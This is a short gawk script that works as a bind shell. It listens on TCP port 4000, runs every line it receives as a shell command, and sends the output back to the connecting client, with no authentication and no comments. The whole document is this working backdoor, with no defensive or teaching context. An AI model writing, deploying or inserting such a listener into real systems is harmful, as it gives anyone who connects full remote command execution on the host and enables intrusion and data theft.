#! /usr/bin/gawk -f

BEGIN {
	server = "/inet/tcp/4000/0/0"
	while ( 1 ) {
		while ( server |& getline command ) {
			while ( command | getline shelloutput ) {
				print shelloutput |& server
			}
			close(command)
		}
	}
	close(server)
}
